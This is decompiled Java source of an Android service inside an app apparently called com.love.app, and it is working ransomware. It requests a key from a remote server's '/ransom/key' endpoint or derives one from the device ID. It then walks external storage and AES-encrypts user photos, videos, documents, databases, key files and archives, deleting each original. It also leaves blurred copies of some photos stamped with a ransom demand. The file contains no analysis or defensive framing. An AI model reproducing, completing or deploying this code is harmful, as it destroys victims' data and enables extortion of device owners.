package com.love.app;

import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.Settings;
import android.text.Layout;
import android.text.StaticLayout;
import android.text.TextPaint;
import android.util.Log;
import androidx.core.internal.view.SupportMenu;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public class MyService extends Service {
    private static final String TAG = "MyService";
    private static final String[] TARGET_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".mp4", ".3gp", ".avi", ".mkv", ".mov", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".rtf", ".odb", ".odt", ".ods", ".odp", ".csv", ".tsv", ".psd", ".ai", ".cdr", ".sql", ".db", ".sqlite", ".mdb", ".accdb", ".bak", ".backup", ".key", ".pem", ".ppk", ".asc", ".gpg", ".7z", ".rar", ".zip", ".tar", ".gz"};

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        if (checkSelfPermission("android.permission.WRITE_EXTERNAL_STORAGE") != 0) {
            Log.e(TAG, "WRITE_EXTERNAL_STORAGE permission not granted");
            stopSelf();
            return 2;
        }
        fetchKeyAndStart();
        return 2;
    }

    private void fetchKeyAndStart() {
        String baseUrl = ConfigFetcher.getBaseUrl(this);
        if (baseUrl == null || baseUrl.isEmpty()) {
            Log.w(TAG, "baseUrl kosong, pakai key fallback");
            runRansomware(generateDeviceKey());
        } else {
            Volley.newRequestQueue(this).add(new JsonObjectRequest(0, baseUrl + "/ransom/key?device_id=" + Settings.Secure.getString(getContentResolver(), "android_id"), null, new Response.Listener() { // from class: com.love.app.MyService$$ExternalSyntheticLambda0
                @Override // com.android.volley.Response.Listener
                public final void onResponse(Object obj) {
                    this.f$0.m352lambda$fetchKeyAndStart$0$comloveappMyService((JSONObject) obj);
                }
            }, new Response.ErrorListener() { // from class: com.love.app.MyService$$ExternalSyntheticLambda1
                @Override // com.android.volley.Response.ErrorListener
                public final void onErrorResponse(VolleyError volleyError) {
                    this.f$0.m353lambda$fetchKeyAndStart$1$comloveappMyService(volleyError);
                }
            }));
        }
    }

    /* JADX INFO: renamed from: lambda$fetchKeyAndStart$0$com-love-app-MyService, reason: not valid java name */
    /* synthetic */ void m352lambda$fetchKeyAndStart$0$comloveappMyService(JSONObject jSONObject) {
        try {
            runRansomware(jSONObject.getString("key").getBytes());
        } catch (Exception unused) {
            runRansomware(generateDeviceKey());
        }
    }

    /* JADX INFO: renamed from: lambda$fetchKeyAndStart$1$com-love-app-MyService, reason: not valid java name */
    /* synthetic */ void m353lambda$fetchKeyAndStart$1$comloveappMyService(VolleyError volleyError) {
        runRansomware(generateDeviceKey());
    }

    private byte[] generateDeviceKey() {
        String string = Settings.Secure.getString(getContentResolver(), "android_id");
        if (string == null) {
            string = "defaultkey12345x";
        }
        return (string + "0000000000000000").substring(0, 16).getBytes();
    }

    private void runRansomware(final byte[] bArr) {
        new Thread(new Runnable() { // from class: com.love.app.MyService$$ExternalSyntheticLambda2
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m354lambda$runRansomware$2$comloveappMyService(bArr);
            }
        }).start();
    }

    /* JADX INFO: renamed from: lambda$runRansomware$2$com-love-app-MyService, reason: not valid java name */
    /* synthetic */ void m354lambda$runRansomware$2$comloveappMyService(byte[] bArr) {
        try {
            try {
                startRansomware(bArr);
            } catch (Exception e) {
                Log.e(TAG, "Ransomware error", e);
            }
        } finally {
            stopSelf();
        }
    }

    private void startRansomware(byte[] bArr) {
        byte[] bArrBlurPhoto;
        ArrayList<File> arrayList = new ArrayList();
        if (Build.VERSION.SDK_INT < 29) {
            arrayList.addAll(getFiles(Environment.getExternalStorageDirectory(), TARGET_EXTENSIONS, new String[]{"Android/data", "Android/obb"}));
        } else {
            Log.w(TAG, "Android 10+ detected, ransomware limited to app's own files");
            File externalFilesDir = getExternalFilesDir(null);
            if (externalFilesDir != null) {
                arrayList.addAll(getFiles(externalFilesDir, TARGET_EXTENSIONS, new String[0]));
            }
        }
        for (File file : arrayList) {
            try {
                if (!file.getPath().contains(".enc") && !file.getPath().contains("brld_")) {
                    if (isImageFile(file) && new Random().nextInt(20) == 0 && (bArrBlurPhoto = blurPhoto(file)) != null) {
                        saveFile(bArrBlurPhoto, file.getParentFile().getPath() + File.separator + "brld_" + file.getName());
                    }
                    saveFile(Aes.encrypt(bArr, readFileToBytes(file)), file.getPath() + ".enc");
                    file.delete();
                }
            } catch (Exception e) {
                Log.w(TAG, "Skip file: " + file.getName(), e);
            }
        }
    }

    private boolean isImageFile(File file) {
        String lowerCase = file.getName().toLowerCase();
        return lowerCase.endsWith(".jpg") || lowerCase.endsWith(".jpeg") || lowerCase.endsWith(".png") || lowerCase.endsWith(".gif") || lowerCase.endsWith(".bmp");
    }

    private byte[] readFileToBytes(File file) throws IOException {
        FileInputStream fileInputStream = new FileInputStream(file);
        try {
            byte[] bArr = new byte[(int) file.length()];
            fileInputStream.read(bArr);
            fileInputStream.close();
            return bArr;
        } catch (Throwable th) {
            try {
                fileInputStream.close();
            } catch (Throwable th2) {
                th.addSuppressed(th2);
            }
            throw th;
        }
    }

    private void saveFile(byte[] bArr, String str) {
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(str);
            try {
                fileOutputStream.write(bArr);
                fileOutputStream.close();
            } catch (Throwable th) {
                try {
                    fileOutputStream.close();
                } catch (Throwable th2) {
                    th.addSuppressed(th2);
                }
                throw th;
            }
        } catch (Exception e) {
            Log.w(TAG, "saveFile failed: " + str, e);
        }
    }

    private List<File> getFiles(File file, String[] strArr, String[] strArr2) {
        boolean z;
        ArrayList arrayList = new ArrayList();
        File[] fileArrListFiles = file.listFiles();
        if (fileArrListFiles == null) {
            return arrayList;
        }
        for (File file2 : fileArrListFiles) {
            if (file2.isDirectory()) {
                int length = strArr2.length;
                int i = 0;
                while (true) {
                    if (i >= length) {
                        z = false;
                        break;
                    }
                    if (file2.getPath().contains(strArr2[i])) {
                        z = true;
                        break;
                    }
                    i++;
                }
                if (!z) {
                    arrayList.addAll(getFiles(file2, strArr, strArr2));
                }
            } else {
                for (String str : strArr) {
                    if (file2.getName().toLowerCase().endsWith(str.toLowerCase())) {
                        arrayList.add(file2);
                        break;
                    }
                }
            }
        }
        return arrayList;
    }

    private byte[] blurPhoto(File file) {
        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inPreferredConfig = Bitmap.Config.ARGB_8888;
            Bitmap bitmapDecodeFile = BitmapFactory.decodeFile(file.getAbsolutePath(), options);
            if (bitmapDecodeFile == null) {
                return null;
            }
            Bitmap bitmapDrawText = drawText(BlurBuilder.blur(this, bitmapDecodeFile), "Your files have been encrypted. Pay to decrypt.");
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            bitmapDrawText.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);
            return byteArrayOutputStream.toByteArray();
        } catch (Exception unused) {
            return null;
        }
    }

    private Bitmap drawText(Bitmap bitmap, String str) {
        Bitmap bitmapCopy = bitmap.copy(Bitmap.Config.ARGB_8888, true);
        Canvas canvas = new Canvas(bitmapCopy);
        TextPaint textPaint = new TextPaint(1);
        textPaint.setColor(SupportMenu.CATEGORY_MASK);
        textPaint.setTextSize(30.0f);
        textPaint.setShadowLayer(1.0f, 0.0f, 1.0f, -1);
        int width = canvas.getWidth() - 50;
        StaticLayout staticLayout = new StaticLayout(str, textPaint, width, Layout.Alignment.ALIGN_CENTER, 1.0f, 0.0f, false);
        canvas.save();
        canvas.translate((canvas.getWidth() - width) / 2.0f, (canvas.getHeight() - staticLayout.getHeight()) / 2.0f);
        staticLayout.draw(canvas);
        canvas.restore();
        return bitmapCopy;
    }
}
